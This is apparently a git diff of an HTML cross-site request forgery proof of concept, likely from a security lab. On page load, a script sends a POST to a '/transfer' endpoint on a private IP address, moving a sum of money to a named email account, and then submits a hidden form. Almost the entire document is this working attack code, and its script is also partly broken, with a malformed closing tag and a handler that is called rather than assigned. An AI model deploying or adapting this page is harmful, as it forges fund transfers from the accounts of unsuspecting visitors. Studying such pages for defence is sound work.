@@ -1,8 +1,4 @@
 <!DOCTYPE html>
-<!--[if lt IE 7]>      <html class="no-js lt-ie9 lt-ie8 lt-ie7"> <![endif]-->
-<!--[if IE 7]>         <html class="no-js lt-ie9 lt-ie8"> <![endif]-->
-<!--[if IE 8]>         <html class="no-js lt-ie9"> <![endif]-->
-<!--[if gt IE 8]>      <html class="no-js"> <!--<![endif]-->
 <html>
   <head>
     <meta charset="utf-8" />
@@ -13,13 +9,7 @@
     <link rel="stylesheet" href="" />
   </head>
   <body>
-    <form
-      name="myForm"
-      id="myForm"
-      target="_myFrame"
-      action="test.php"
-      method="POST"
-    >
+    <form name="myForm" id="myForm" target="_myFrame" method="POST">
       <p>
         <input name="user_to" value="test" />
       </p>
@@ -29,9 +19,10 @@
     </form>
 
     <script type="text/javascript">
-              function getMoney(){
-                      let data = {"user_to":"user1@gmail.com","amount":10000};
-                      function submitform(){
+
+                      let data = {"user_to":"user1@gmail.com","amount":1000};
+                    function submitform(){
+                      let data = {"user_to":"user1@gmail.com","amount":1000};
                         fetch("http://192.168.2.98:49698/transfer", {
           method: "POST",
           headers: {'Content-Type': 'application/json'},
@@ -41,8 +32,8 @@
         });
                         document.forms["myForm"].submit();
       }
-      window.onload =getMoney()
-                  }
+      window.onload = submitform()
+
               </script
 
               <script src="" async defer>
